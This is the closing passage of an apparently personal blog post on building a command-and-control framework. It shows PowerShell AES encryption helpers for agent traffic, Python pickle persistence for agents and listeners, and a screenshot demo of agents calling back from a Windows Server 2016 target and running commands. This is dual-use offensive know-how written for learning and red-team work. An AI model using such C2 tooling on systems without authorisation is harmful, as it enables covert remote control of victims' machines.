class="variable">$key</span>.getType().Name <span class="operator">-eq</span> <span class="string">"String"</span>) &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.Key = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$key</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.Key = <span class="variable">$key</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$aesManaged</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The <code>Encrypt</code> function takes a key and a plain text string, converts that string to bytes, then it uses the <code>Create-AesManagedObject</code> function to create the <code>AesManaged</code> object and it encrypts the string with a random generated <code>IV</code>.</p>
<p>It returns the cipher text <code>base-64</code> encoded.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$unencryptedString</span>)</span></span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$bytes</span>             = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$unencryptedString</span>)</span><br><span class="line">    <span class="variable">$aesManaged</span>        = Create<span class="literal">-AesManagedObject</span> <span class="variable">$key</span></span><br><span class="line">    <span class="variable">$encryptor</span>         = <span class="variable">$aesManaged</span>.CreateEncryptor()</span><br><span class="line">    <span class="variable">$encryptedData</span>     = <span class="variable">$encryptor</span>.TransformFinalBlock(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length);</span><br><span class="line">    [<span class="built_in">byte</span>[]] <span class="variable">$fullData</span> = <span class="variable">$aesManaged</span>.IV + <span class="variable">$encryptedData</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.Dispose()</span><br><span class="line">    [<span class="type">System.Convert</span>]::ToBase64String(<span class="variable">$fullData</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The opposite of this process happens with the <code>Decrypt</code> function:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$encryptedStringWithIV</span>)</span></span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$bytes</span>           = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$encryptedStringWithIV</span>)</span><br><span class="line">    <span class="variable">$IV</span>              = <span class="variable">$bytes</span>[<span class="number">0</span><span class="type">..15</span>]</span><br><span class="line">    <span class="variable">$aesManaged</span>      = Create<span class="literal">-AesManagedObject</span> <span class="variable">$key</span> <span class="variable">$IV</span></span><br><span class="line">    <span class="variable">$decryptor</span>       = <span class="variable">$aesManaged</span>.CreateDecryptor();</span><br><span class="line">    <span class="variable">$unencryptedData</span> = <span class="variable">$decryptor</span>.TransformFinalBlock(<span class="variable">$bytes</span>, <span class="number">16</span>, <span class="variable">$bytes</span>.Length - <span class="number">16</span>);</span><br><span class="line">    <span class="variable">$aesManaged</span>.Dispose()</span><br><span class="line">    [<span class="type">System.Text.Encoding</span>]::UTF8.GetString(<span class="variable">$unencryptedData</span>).Trim([<span class="built_in">char</span>]<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Listeners-Agents-Persistency"><a href="#Listeners-Agents-Persistency" class="headerlink" title="Listeners / Agents Persistency"></a>Listeners / Agents Persistency</h2><p>I used <code>pickle</code> to serialize agents and listeners and save them in databases, when you exit the server it saves all of the agent objects and listeners, then when you start it again it loads those objects again so you don’t lose your agents or listeners. </p>
<p>For the listeners, <code>pickle</code> can’t serialize objects that use threads, so instead of saving the objects themselves I created a dictionary that holds all the information of the active listeners and serialized that, the server loads that dictionary and starts the listeners again according to the options in the dictionary.</p>
<p>I created wrapper functions that read, write and remove objects from the databases:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readFromDatabase</span><span class="params">(database)</span>:</span></span><br><span class="line">    </span><br><span class="line">    data = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(database, <span class="string">'rb'</span>) <span class="keyword">as</span> d:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data.append(pickle.load(d))</span><br><span class="line">            <span class="keyword">except</span> EOFError:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeToDatabase</span><span class="params">(database,newData)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(database, <span class="string">"ab"</span>) <span class="keyword">as</span> d:</span><br><span class="line">        pickle.dump(newData, d, pickle.HIGHEST_PROTOCOL)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">removeFromDatabase</span><span class="params">(database,name)</span>:</span></span><br><span class="line">    </span><br><span class="line">    data = readFromDatabase(database)</span><br><span class="line">    final = OrderedDict()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        final[i.name] = i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">del</span> final[name]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(database, <span class="string">"wb"</span>) <span class="keyword">as</span> d:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> final:</span><br><span class="line">            pickle.dump(final[i], d , pickle.HIGHEST_PROTOCOL)</span><br></pre></td></tr></table></figure>



<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>I will show you a quick demo on a Windows Server 2016 target.</p>
<p>This is how the home of the server looks like:</p>
<p><img src="/images/misc/c2/1.png" alt=""></p>
<p>Let’s start by creating a listener:</p>
<p><img src="/images/misc/c2/2.png" alt=""></p>
<p>Now let’s create a payload, I created the three available payloads:</p>
<p><img src="/images/misc/c2/3.png" alt=""></p>
<p>After executing the payloads on the target we’ll see that the agents successfully contacted the server:</p>
<p><img src="/images/misc/c2/4.png" alt=""></p>
<p>Let’s rename the agents:</p>
<p><img src="/images/misc/c2/5.png" alt=""></p>
<p><img src="/images/misc/c2/6.png" alt=""></p>
<p>I executed 4 simple commands on each agent:</p>
<p><img src="/images/misc/c2/7.png" alt=""></p>
<p><img src="/images/misc/c2/8.png" alt=""></p>
<p><img src="/images/misc/c2/9.png" alt=""></p>
<p>Then I tasked each agent to quit.</p>
<p>And that concludes this blog post, as I said before I would appreciate all the feedback and the suggestions so feel free to contact me on twitter <a href="https://www.twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a>.</p>
<p>If you liked the article tweet about it, thanks for reading.</p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2020-04-16</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/misc/">misc</a>

      <a class="tag-link" href="/tags/c2/" rel="tag">#c2</a> <a class="tag-link" href="/tags/cpp/" rel="tag">#cpp</a> <a class="tag-link" href="/tags/cryptography/" rel="tag">#cryptography</a> <a class="tag-link" href="/tags/powershell/" rel="tag">#powershell</a> <a class="tag-link" href="/tags/python/" rel="tag">#python</a> <a class="tag-link" href="/tags/windows/" rel="tag">#windows</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
